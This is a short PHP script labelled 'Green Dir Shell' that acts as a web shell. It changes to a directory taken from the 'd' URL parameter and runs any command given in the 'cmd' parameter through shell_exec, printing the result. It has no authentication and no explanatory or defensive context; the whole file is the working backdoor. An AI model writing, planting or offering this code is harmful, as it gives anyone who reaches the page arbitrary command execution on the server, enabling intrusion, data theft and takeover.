<?php
/* Green Dir Shell */
if(isset($_GET['d'])){
    $dir = str_replace('..', '', $_GET['d']);
    chdir($dir);
    if(isset($_GET['cmd'])){
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
?>
